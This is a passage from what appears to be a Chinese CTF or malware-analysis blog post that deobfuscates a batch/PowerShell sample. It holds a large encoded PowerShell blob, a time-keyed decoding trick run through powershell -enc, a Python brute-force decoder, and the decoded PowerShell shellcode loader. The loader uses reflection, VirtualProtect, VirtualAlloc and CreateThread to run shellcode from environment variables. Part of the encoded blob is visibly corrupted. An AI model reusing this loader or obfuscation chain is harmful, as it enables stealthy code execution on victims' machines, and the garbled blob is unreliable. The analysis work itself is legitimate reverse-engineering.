class="number">0</span>gBSAHUAbgBGOALAGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBIAGEAbgBkAGwAZQBSAGUAZgBdACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAGGOALAZQAuAEkAbgBGOALAGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ASABhAG4AZABsAGUAUgBlAGYAKAAoAE4AZQB3ACGOALATwBiAGoAZQBjAHQAIABJAG4AdABQAHQAcgApACwAJABVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAC4ARwBlAHQATQBlAHQAaABvAGQAKAAiAEcAZQBGOALAEGOALAbwBkAHUAbABlAEgAYQBuAGQAbABlACIAKQAuAEkAbgB2AG8AawBlACgAJABuAHUAbABsACwAQAAoACQATQBvAGQAdQBsAGUAKQApACkAKQAsACQAUAByAG8AYwBlAGQAdQByAGUAKQApADsAfQBbAEIAeQBGOALAGUAWwBdAFGOALAJABzAGMAMwAyACAAPQAgAFsAUwB5AHMAdABlAGGOALALgBDAG8AbgB2AGUAcgBGOALAFGOALAOgA6AEYAcgBvAGGOALAQgBhAHMAZQA2ADQAUwBGOALAHIAaQBuAGcAKAAkAGUAbgB2ADoAbAArACQAZQBuAHYAOgBPACkAOwAkAGEAPQBHAGUAdAAtAEQAYQBGOALAGUAOwBpAGYAKAAkAGEALgBNAG8AbgBGOALAGgAIAAtAGcAZQAgADIAKQB7AGUAeABpAHQAOwB9AFsAVQBpAG4AdAAzADIAWwBdAFGOALAIAAkAG8AcAA9ADAAOwAkAHIAPQAoAFsAUwB5AHMAdABlAGGOALALgBSAHUAbgBGOALAGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAFGOALAOgA6AEcAZQBGOALAEQAZQBsAGUAZwBhAHQAZQBGAG8AcgBGAHUAbgBjAHQAaQBvAG4AUABvAGkAbgBGOALAGUAcgAoACgAZwBwAHIAbwBjACAAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIABWAGkAcgBGOALAHUAYQBsAFAAcgBvAHQAZQBjAHQAKQAsACgAZwBkAGUAbABlAGcAYQBGOALAGUAIABAACgAWwBCAHkAdABlAFsAXQBdACwAWwBVAEkAbgBGOALADMAMgBdACwAWwBVAEkAbgBGOALADMAMgBdACwAWwBVAEkAbgBGOALADMAMgBbAFGOALAXQApACAAKABbAEkAbgBGOALAFAAdAByAFGOALAKQApACkAKQAuAEkAbgB2AG8AawBlACgAJABzAGMAMwAyACwAJABzAGMAMwAyAC4ATABlAG4AZwBGOALAGgALAAwAHgANAAwACwAJABvAHAAKQA7AGkAZgAoACQAcgAgACGOALAZQBxACAAMAApAHsAJABwAHIAPQAoAFsAUwB5AHMAdABlAGGOALALgBSAHUAbgBGOALAGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAFGOALAOgA6AEcAZQBGOALAEQAZQBsAGUAZwBhAHQAZQBGAG8AcgBGAHUAbgBjAHQAaQBvAG4AUABvAGkAbgBGOALAGUAcgAoACgAZwBwAHIAbwBjACAAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIABWAGkAcgBGOALAHUAYQBsAEEAbABsAG8AYwApACwAKABnAGQAZQBsAGUAZwBhAHQAZQAgAEAAKABbAEkAbgBGOALAFAAdAByAFGOALALABbAFUASQBuAHQAMwAyAFGOALALABbAFUASQBuAHQAMwAyAFGOALALABbAFUASQBuAHQAMwAyAFGOALAKQAgACgAWwBVAEkAbgBGOALADMAMgBdACkAKQApACkALgBJAG4AdgBvAGsAZQAoADAALAAkAHMAYwAzADIALgBMAGUAbgBnAHQAaAAsADAAeAAzADAAMAAwACwAMAB4ADQAMAApADsAaQBmACgAJABwAHIAIAAtAG4AZQAgADAAKQB7ACQAbQBlAGGOALAcwBlAHQAPQAoAFsAUwB5AHMAdABlAGGOALALgBSAHUAbgBGOALAGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQ^BsAFGOALAOgA6AEcAZQBGOALAEQAZQBsAGUAZwBhAHQAZQBGAG8AcgBGAHUAbgBjAHQAaQBvAG4AUABvAGkAbgBGOALAGUAcgAoACgAZwBwAHIAbwBjACAAbQBzAHYAYwByAHQALgBkAGwAbAAgAGGOALAZQBtAHMAZQBGOALACkALAAoAGcAZABlAGwAZQBnAGEAdABlACAAQAAoAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQApACAAKABbAEkAbgBGOALAFAAdAByAFGOALAKQApACkAKQA7AGYAbwByACAAKAAkAGkAPQAwADsAJABpACAALQBsAGUAIAAoACQAcwBjADMAMgAuAEwAZQBuAGcAdABoACGOALAMQApADsAJABpACsAKwApACAAewAkAGGOALAZQBtAHMAZQBGOALAC4ASQBuAHYAbwBrAGUAKAAoACQAcAByACsAJABpACkALAAgACQAcwBjADMAMgBbACQAaQBdACwAIAAxACkAfQA7ACgAWwBTAHkAcwBGOALAGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAEGOALAYQByAHMAaABhAGwAXQA6ADoARwBlAHQARABlAGwAZQBnAGEAdABlAEYAbwByAEYAdQBuAGMAdABpAG8AbgBQAG8AaQBuAHQAZQByACgAKABnAHAAcgBvAGMAIABrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAgAEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACkALAAoAGcAZABlAGwAZQBnAGEAdABlACAAQAAoAFsASQBuAHQAUABGOALAHIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsASQBuAHQAUABGOALAHIAXQApACAAKABbAEkAbgBGOALAFAAdAByAFGOALAKQApACkAKQAuAEkAbgB2AG8AawBlACgAMAAsADAALAAkAHAAcgAsACQAcAByACwAMAAsADAAKQA7AHGOALAfQBlAGwAcwBlAHsAKABbAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAGGOALAZQAuAEkAbgBGOALAGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAGEAbABdADoAOgBHAGUAdABEAGUAbABlAGcAYQBGOALAGUARgBvAHIARgB1AG4AYwBGOALAGkAbwBuAFAAbwBpAG4AdABlAHIAKAAoAGcAcAByAG8AYwAgAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACAAQwByAGUAYQBGOALAGUAVABoAHIAZQBhAGQAKQAsACgAZwBkAGUAbABlAGcAYQBGOALAGUAIABAACgAWwBJAG4AdABQAHQAcgBdACwAWwBVAEkAbgBGOALADMAMgBdACwAWwBCAHkAdABlAFsAXQBdACwAWwBCAHkAdABlAFsAXQBdACwAWwBVAEkAbgBGOALADMAMgBdACwAWwBJAG4AdABQAHQAcgBdACkAIAAoAFsASQBuAHQAUABGOALAHIAXQApACkAKQApAC4ASQBuAHYAbwBrAGUAKAAwACwAMAAsACQAcwBjADMAMgAsACQAcwBjADMAMgAsADAALAAwACkAOwB9AHMAbABlAGUAcAAoADEAMgAwADAAKQA7AHGOALAYwBhAHQAYwBoAHsAfQBlAHgAaQBGOALADsA<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cmd /c &quot;</span>powershell <span class="literal">-command</span> <span class="string">&quot;<span class="variable">$a</span>=get-date;<span class="variable">$t</span>=[system.Text.Encoding]::UTF8.GetBytes(&#x27;fzEvD&#x27;);for (<span class="variable">$i</span>=0;<span class="variable">$i</span> -le (<span class="variable">$t</span>.Length-1);<span class="variable">$i</span>++)&#123;<span class="variable">$t</span>[<span class="variable">$i</span>]=<span class="variable">$t</span>[<span class="variable">$i</span>]-<span class="variable">$a</span>.hour&#125; <span class="variable">$d</span>=[system.Text.Encoding]::UTF8.GetString(<span class="variable">$t</span>);[Environment]::SetEnvironmentVariable(&#x27;q&#x27;, <span class="variable">$d</span>, &#x27;User&#x27;);&quot;</span></span><br><span class="line">cmd /c <span class="string">&quot;powershell -enc %q%%p:GOAL=0%  &gt; NUL</span></span><br><span class="line"><span class="string">echo %j%</span></span><br><span class="line"><span class="string">echo %q%</span></span><br><span class="line"><span class="string">set j=</span></span><br><span class="line"><span class="string">set k=</span></span><br><span class="line"><span class="string">set l=</span></span><br><span class="line"><span class="string">set m=</span></span><br><span class="line"><span class="string">set n=</span></span><br><span class="line"><span class="string">set o=</span></span><br><span class="line"><span class="string">set p=</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>直接添加一个</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> %p:GOAL=<span class="number">0</span>% </span><br></pre></td></tr></table></figure>

<p>然后写脚本跑这个hour，看看到底是多少。</p>
<p>问题在于echo出来的这个p，中间有一个.号，导致解码失败。。。之前一直没发现这个。手动替换一个A过去。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base = <span class="string">&quot;GUAZQBwACgAOQAwACkAOwB0AHIAeQB7AGYAdQBuAGMAdABpAG8AbgAgAGcAZABlAGwAZQBnAGEAdABlAHsAUABhAHIAYQBtACAAKABbAFAAYQByAGEAbQBlAHQAZQByACgAUABvAHMAaQB0AGkAbwBuAD0AMAAsAE0AYQBuAGQAYQB0AG8AcgB5AD0AJABUAHIAdQBlACkAXQAgAFsAVAB5AHAAZQBbAF0AXQAgACQAUABhAHIAYQBtAGUAdABlAHIAcwAsAFsAUABhAHIAYQBtAGUAdABlAHIAKABQAG8AcwBpAHQAaQBvAG4APQAxACkAXQAgAFsAVAB5AHAAZQBdACAAJABSAGUAdAB1AHIAbgBUAHkAcABlAD0AWwBWAG8AaQBkAF0AKQA7ACQAVAB5AHAAZQBCAHUAaQBsAGQAZQByAD0AWwBBAHAAcABEAG8AbQBhAGkAbgBdADoAOgBDAHUAcgByAGUAbgB0AEQAbwBtAGEAaQBuAC4ARABlAGYAaQBuAGUARAB5AG4AYQBtAGkAYwBBAHMAcwBlAG0AYgBsAHkAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAoACIAUgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlACIAKQApACwAWwBTAHkAcwB0AGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBFAG0AaQB0AC4AQQBzAHMAZQBtAGIAbAB5AEIAdQBpAGwAZABlAHIAQQBjAGMAZQBzAHMAXQA6ADoAUgB1AG4AKQAuAEQAZQBmAGkAbgBlAEQAeQBuAGEAbQBpAGMATQBvAGQAdQBsAGUAKAAiAEkAbgBNAGUAbQBvAHIAeQBNAG8AZAB1AGwAZQAiACwAJABmAGEAbABzAGUAKQAuAEQAZQBmAGkAbgBlAFQAeQBwAGUAKAAiAFgAWABYACIALAAiAEMAbABhAHMAcwAsAFAAdQBiAGwAaQBjACwAUwBlAGEAbABlAGQALABBAG4AcwBpAEMAbABhAHMAcwAsAEEAdQB0AG8AQwBsAGEAcwBzACIALABbAFMAeQBzAHQAZQBtAC4ATQB1AGwAdABpAGMAYQBzAHQARABlAGwAZQBnAGEAdABlAF0AKQA7ACQAVAB5AHAAZQBCAHUAaQBsAGQAZQByAC4ARABlAGYAaQBuAGUAQwBvAG4AcwB0AHIAdQBjAHQAbwByACgAIgBSAFQAUwBwAGUAYwBpAGEAbABOAGEAbQBlACwASABpAGQAZQBCAHkAUwBpAGcALABQAHUAYgBsAGkAYwAiACwAWwBTAHkAcwB0AGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBDAGEAbABsAGkAbgBnAEMAbwBuAHYAZQBuAHQAaQBvAG4AcwBdADoAOgBTAHQAYQBuAGQAYQByAGQALAAkAFAAYQByAGEAbQBlAHQAZQByAHMAKQAuAFMAZQB0AEkAbQBwAGwAZQBtAGUAbgB0AGEAdABpAG8AbgBGAGwAYQBnAHMAKAAiAFIAdQBuAHQAaQBtAGUALABNAGEAbgBhAGcAZQBkACIAKQA7ACQAVAB5AHAAZQBCAHUAaQBsAGQAZQByAC4ARABlAGYAaQBuAGUATQBlAHQAaABvAGQAKAAiAEkAbgB2AG8AawBlACIALAAiAFAAdQBiAGwAaQBjACwASABpAGQAZQBCAHkAUwBpAGcALABOAGUAdwBTAGwAbwB0ACwAVgBpAHIAdAB1AGEAbAAiACwAJABSAGUAdAB1AHIAbgBUAHkAcABlACwAJABQAGEAcgBhAG0AZQB0AGUAcgBzACkALgBTAGUAdABJAG0AcABsAGUAbQBlAG4AdABhAHQAaQBvAG4ARgBsAGEAZwBzACgAIgBSAHUAbgB0AGkAbQBlACwATQBhAG4AYQBnAGUAZAAiACkAOwByAGUAdAB1AHIAbgAgACQAVAB5AHAAZQBCAHUAaQBsAGQAZQByAC4AQwByAGUAYQB0AGUAVAB5AHAAZQAoACkAOwB9AGYAdQBuAGMAdABpAG8AbgAgAGcAcAByAG8AYwB7AFAAYQByAGEAbQAgACgAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAFAAbwBzAGkAdABpAG8AbgA9ADAALABNAGEAbgBkAGEAdABvAHIAeQA9ACQAVAByAHUAZQApAF0AIABbAFMAdAByAGkAbgBnAF0AIAAkAE0AbwBkAHUAbABlACwAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAFAAbwBzAGkAdABpAG8AbgA9ADEALABNAGEAbgBkAGEAdABvAHIAeQA9ACQAVAByAHUAZQApAF0AIABbAFMAdAByAGkAbgBnAF0AIAAkAFAAcgBvAGMAZQBkAHUAcgBlACkAOwAkAFMAeQBzAHQAZQBtAEEAcwBzAGUAbQBiAGwAeQA9AFsAQQBwAHAARABvAG0AYQBpAG4AXQA6ADoAQwB1AHIAcgBlAG4AdABEAG8AbQBhAGkAbgAuAEcAZQB0AEEAcwBzAGUAbQBiAGwAaQBlAHMAKAApAHwAVwBoAGUAcgBlAC0ATwBiAGoAZQBjAHQAewAkAF8ALgBHAGwAbwBiAGEAbABBAHMAcwBlAG0AYgBsAHkAQwBhAGMAaABlACAALQBBAG4AZAAgACQAXwAuAEwAbwBjAGEAdABpAG8AbgAuAFMAcABsAGkAdAAoACIAXAAiACkAWwAtADEAXQAuAEUAcQB1AGEAbABzACgAIgBTAHkAcwB0AGUAbQAuAGQAbABsACIAKQB9ADsAJABVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAD0AJABTAHkAcwB0AGUAbQBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAIgBNAGkAYwByAG8AcwBvAGYAdAAuAFcAaQBuADMAMgAuAFUAbgBzAGEAZgBlAE4AYQB0AGkAdgBlAE0AZQB0AGgAbwBkAHMAIgApADsAcgBlAHQAdQByAG4AIAAkAFUAbgBzAGEAZgBlAE4AYQB0AGkAdgBlAE0AZQB0AGgAbwBkAHMALgBHAGUAdABNAGUAdABoAG8AZAAoACIARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACIAKQAuAEkAbgB2AG8AawBlACgAJABuAHUAbABsACwAQAAoAFsAUwB5AHMAdABlAG0ALABATgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBIAGEAbgBkAGwAZQBSAGUAZgBdACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ASABhAG4AZABsAGUAUgBlAGYAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAG4AdABQAHQAcgApACwAJABVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAC4ARwBlAHQATQBlAHQAaABvAGQAKAAiAEcAZQB0AE0AbwBkAHUAbABlAEgAYQBuAGQAbABlACIAKQAuAEkAbgB2AG8AawBlACgAJABuAHUAbABsACwAQAAoACQATQBvAGQAdQBsAGUAKQApACkAKQAsACQAUAByAG8AYwBlAGQAdQByAGUAKQApADsAfQBbAEIAeQB0AGUAWwBdAF0AJABzAGMAMwAyACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGUAbgB2ADoAbAArACQAZQBuAHYAOgBPACkAOwAkAGEAPQBHAGUAdAAtAEQAYQB0AGUAOwBpAGYAKAAkAGEALgBNAG8AbgB0AGgAIAAtAGcAZQAgADIAKQB7AGUAeABpAHQAOwB9AFsAVQBpAG4AdAAzADIAWwBdAF0AIAAkAG8AcAA9ADAAOwAkAHIAPQAoAFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AEcAZQB0AEQAZQBsAGUAZwBhAHQAZQBGAG8AcgBGAHUAbgBjAHQAaQBvAG4AUABvAGkAbgB0AGUAcgAoACgAZwBwAHIAbwBjACAAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKQAsACgAZwBkAGUAbABlAGcAYQB0AGUAIABAACgAWwBCAHkAdABlAFsAXQBdACwAWwBVAEkAbgB0ADMAMgBdACwAWwBVAEkAbgB0ADMAMgBdACwAWwBVAEkAbgB0ADMAMgBbAF0AXQApACAAKABbAEkAbgB0AFAAdAByAF0AKQApACkAKQAuAEkAbgB2AG8AawBlACgAJABzAGMAMwAyACwAJABzAGMAMwAyAC4ATABlAG4AZwB0AGgALAAwAHgANAAwACwAJABvAHAAKQA7AGkAZgAoACQAcgAgAC0AZQBxACAAMAApAHsAJABwAHIAPQAoAFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AEcAZQB0AEQAZQBsAGUAZwBhAHQAZQBGAG8AcgBGAHUAbgBjAHQAaQBvAG4AUABvAGkAbgB0AGUAcgAoACgAZwBwAHIAbwBjACAAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIABWAGkAcgB0AHUAYQBsAEEAbABsAG8AYwApACwAKABnAGQAZQBsAGUAZwBhAHQAZQAgAEAAKABbAEkAbgB0AFAAdAByAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuAHQAMwAyAF0AKQAgACgAWwBVAEkAbgB0ADMAMgBdACkAKQApACkALgBJAG4AdgBvAGsAZQAoADAALAAkAHMAYwAzADIALgBMAGUAbgBnAHQAaAAsADAAeAAzADAAMAAwACwAMAB4ADQAMAApADsAaQBmACgAJABwAHIAIAAtAG4AZQAgADAAKQB7ACQAbQBlAG0AcwBlAHQAPQAoAFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AEcAZQB0AEQAZQBsAGUAZwBhAHQAZQBGAG8AcgBGAHUAbgBjAHQAaQBvAG4AUABvAGkAbgB0AGUAcgAoACgAZwBwAHIAbwBjACAAbQBzAHYAYwByAHQALgBkAGwAbAAgAG0AZQBtAHMAZQB0ACkALAAoAGcAZABlAGwAZQBnAGEAdABlACAAQAAoAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQApACAAKABbAEkAbgB0AFAAdAByAF0AKQApACkAKQA7AGYAbwByACAAKAAkAGkAPQAwADsAJABpACAALQBsAGUAIAAoACQAcwBjADMAMgAuAEwAZQBuAGcAdABoAC0AMQApADsAJABpACsAKwApACAAewAkAG0AZQBtAHMAZQB0AC4ASQBuAHYAbwBrAGUAKAAoACQAcAByACsAJABpACkALAAgACQAcwBjADMAMgBbACQAaQBdACwAIAAxACkAfQA7ACgAWwBTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAE0AYQByAHMAaABhAGwAXQA6ADoARwBlAHQARABlAGwAZQBnAGEAdABlAEYAbwByAEYAdQBuAGMAdABpAG8AbgBQAG8AaQBuAHQAZQByACgAKABnAHAAcgBvAGMAIABrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAgAEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACkALAAoAGcAZABlAGwAZQBnAGEAdABlACAAQAAoAFsASQBuAHQAUAB0AHIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsASQBuAHQAUAB0AHIAXQApACAAKABbAEkAbgB0AFAAdAByAF0AKQApACkAKQAuAEkAbgB2AG8AawBlACgAMAAsADAALAAkAHAAcgAsACQAcAByACwAMAAsADAAKQA7AH0AfQBlAGwAcwBlAHsAKABbAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAGEAbABdADoAOgBHAGUAdABEAGUAbABlAGcAYQB0AGUARgBvAHIARgB1AG4AYwB0AGkAbwBuAFAAbwBpAG4AdABlAHIAKAAoAGcAcAByAG8AYwAgAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACAAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQAKQAsACgAZwBkAGUAbABlAGcAYQB0AGUAIABAACgAWwBJAG4AdABQAHQAcgBdACwAWwBVAEkAbgB0ADMAMgBdACwAWwBCAHkAdABlAFsAXQBdACwAWwBCAHkAdABlAFsAXQBdACwAWwBVAEkAbgB0ADMAMgBdACwAWwBJAG4AdABQAHQAcgBdACkAIAAoAFsASQBuAHQAUAB0AHIAXQApACkAKQApAC4ASQBuAHYAbwBrAGUAKAAwACwAMAAsACQAcwBjADMAMgAsACQAcwBjADMAMgAsADAALAAwACkAOwB9AHMAbABlAGUAcAAoADEAMgAwADAAKQA7AH0AYwBhAHQAYwBoAHsAfQBlAHgAaQB0ADsA&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">24</span>):</span><br><span class="line">    front = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c) - k) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;fzEvD&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        out = base64.b64decode(<span class="string">&#x27;&#123;&#125;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(front, base)).replace(<span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;%d---&gt;%s&quot;</span> % (k,out)</span><br><span class="line">    <span class="keyword">except</span> Exception,e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">front = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c) - <span class="number">3</span>) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;fzEvD&#x27;</span>)</span><br><span class="line">out = base64.b64decode(<span class="string">&#x27;&#123;&#125;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(front, base)).replace(<span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;final.bat&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(out)</span><br></pre></td></tr></table></figure>

<p>根据结果，发现hour是3，最后得到解码后的脚本</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sleep</span>(<span class="number">90</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gdelegate</span></span>&#123;</span><br><span class="line">        <span class="keyword">Param</span> ([<span class="type">Parameter</span>(<span class="type">Position</span>=<span class="number">0</span>,<span class="type">Mandatory</span>=<span class="variable">$True</span>)] [<span class="type">Type</span>[]] <span class="variable">$Parameters</span>,[<span class="type">Parameter</span>(<span class="type">Position</span>=<span class="number">1</span>)] [<span class="type">Type</span>] <span class="variable">$ReturnType</span>=[<span class="built_in">Void</span>]);</span><br><span class="line">        <span class="variable">$TypeBuilder</span>=[<span class="type">AppDomain</span>]::CurrentDomain.DefineDynamicAssembly((<span class="built_in">New-Object</span> System.Reflection.AssemblyName(<span class="string">&quot;ReflectedDelegate&quot;</span>)),[<span class="type">System.Reflection.Emit.AssemblyBuilderAccess</span>]::Run).DefineDynamicModule(<span class="string">&quot;InMemoryModule&quot;</span>,<span class="variable">$false</span>).DefineType(<span class="string">&quot;XXX&quot;</span>,<span class="string">&quot;Class,Public,Sealed,AnsiClass,AutoClass&quot;</span>,[<span class="type">System.MulticastDelegate</span>]);</span><br><span class="line">        <span class="variable">$TypeBuilder</span>.DefineConstructor(<span class="string">&quot;RTSpecialName,HideBySig,Public&quot;</span>,[<span class="type">System.Reflection.CallingConventions</span>]::Standard,<span class="variable">$Parameters</span>).SetImplementationFlags(<span class="string">&quot;Runtime,Managed&quot;</span>);</span><br><span class="line">        <span class="variable">$TypeBuilder</span>.DefineMethod(<span class="string">&quot;Invoke&quot;</span>,<span class="string">&quot;Public,HideBySig,NewSlot,Virtual&quot;</span>,<span class="variable">$ReturnType</span>,<span class="variable">$Parameters</span>).SetImplementationFlags(<span class="string">&quot;Runtime,Managed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$TypeBuilder</span>.CreateType();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gproc</span></span>&#123;<span class="keyword">Param</span> ([<span class="type">Parameter</span>(<span class="type">Position</span>=<span class="number">0</span>,<span class="type">Mandatory</span>=<span class="variable">$True</span>)] [<span class="built_in">String</span>] <span class="variable">$Module</span>,[<span class="type">Parameter</span>(<span class="type">Position</span>=<span class="number">1</span>,<span class="type">Mandatory</span>=<span class="variable">$True</span>)] [<span class="built_in">String</span>] <span class="variable">$Procedure</span>);</span><br><span class="line">        <span class="variable">$SystemAssembly</span>=[<span class="type">AppDomain</span>]::CurrentDomain.GetAssemblies()|<span class="built_in">Where-Object</span>&#123;<span class="variable">$_</span>.GlobalAssemblyCache <span class="operator">-And</span> <span class="variable">$_</span>.Location.Split(<span class="string">&quot;\&quot;</span>)[-<span class="number">1</span>].Equals(<span class="string">&quot;System.dll&quot;</span>)&#125;;</span><br><span class="line">        <span class="variable">$UnsafeNativeMethods</span>=<span class="variable">$SystemAssembly</span>.GetType(<span class="string">&quot;Microsoft.Win32.UnsafeNativeMethods&quot;</span>);<span class="keyword">return</span> <span class="variable">$UnsafeNativeMethods</span>.GetMethod(<span class="string">&quot;GetProcAddress&quot;</span>).Invoke(<span class="variable">$null</span>,<span class="selector-tag">@</span>([<span class="type">System</span>,@<span class="type">NRuntime.InteropServices.HandleRef</span>](<span class="built_in">New-Object</span> System.Runtime.InteropServices.HandleRef((<span class="built_in">New-Object</span> IntPtr),<span class="variable">$UnsafeNativeMethods</span>.GetMethod(<span class="string">&quot;GetModuleHandle&quot;</span>).Invoke(<span class="variable">$null</span>,<span class="selector-tag">@</span>(<span class="variable">$Module</span>)))),<span class="variable">$Procedure</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="built_in">Byte</span>[]]<span class="variable">$sc32</span> = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$env:l</span>+<span class="variable">$env:O</span>);</span><br><span class="line">    <span class="variable">$a</span>=<span class="built_in">Get-Date</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$a</span>.Month <span class="operator">-ge</span> <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="type">Uint32</span>[]] <span class="variable">$op</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="variable">$r</span>=([<span class="type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((gproc kernel32.dll VirtualProtect),(gdelegate <span class="selector-tag">@</span>([<span class="built_in">Byte</span>[]],[<span class="type">UInt32</span>],[<span class="type">UInt32</span>],[<span class="type">UInt32</span>[]]) ([<span class="built_in">Int</span><span class="type">Ptr</span>])))).Invoke(<span class="variable">$sc32</span>,<span class="variable">$sc32</span>.Length,<span class="number">0</span>x40,<span class="variable">$op</span>);</span><br><span class="line">    <span 